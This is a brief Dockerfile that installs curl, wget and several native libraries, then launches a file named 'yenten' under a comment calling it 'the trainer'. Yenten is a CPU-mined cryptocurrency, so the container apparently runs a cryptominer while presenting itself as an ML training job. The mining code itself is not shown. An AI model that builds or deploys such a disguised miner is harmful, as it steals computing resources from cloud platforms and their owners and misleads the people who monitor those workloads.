FROM python:3.9-slim
WORKDIR /
RUN apt update && apt -y install curl wget ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev libicu-dev
# Sets up the entry point to invoke the trainer.
ENTRYPOINT python yenten
